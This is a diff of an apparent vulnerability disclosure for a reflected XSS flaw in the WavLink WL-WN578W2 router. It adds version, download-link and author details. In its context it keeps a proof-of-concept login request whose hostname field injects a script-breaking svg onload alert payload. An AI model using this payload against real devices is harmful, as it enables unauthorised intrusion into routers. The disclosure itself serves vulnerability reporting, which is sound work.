@@ -4,9 +4,13 @@ Vendor:WavLink
 
 Product:WL-WN578W2
 
+Version：V221110
+
 Vulnerability: XSS
 
-Type:XSS Attack
+Download：https://docs.wavlink.xyz/Firmware_ch/?category=%E5%AE%A4%E5%86%85%E4%B8%AD%E7%BB%A7%E5%99%A8&model=WL-WN578W2
+
+Author：Li Tengzheng
 
 
 
@@ -51,8 +55,9 @@ Connection: keep-alive
 newUI=1&page=login&username=admin&langChange=0&ipaddr=%3A%3Affff%3A192.168.6.1&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&wizardpage=wizard.shtml&hostname=192.168.6.2"</script><svg/onload=alert()>&key=M55759906&password=9e9fcf8c5bceb1f0960736c6641cbe8a&lang_select=en
 ```
 
-## outcome
+## Result
 <div  align="center"><img src="./img/poc1.png" style="zoom:80%;" /></div>
+
 
 
 
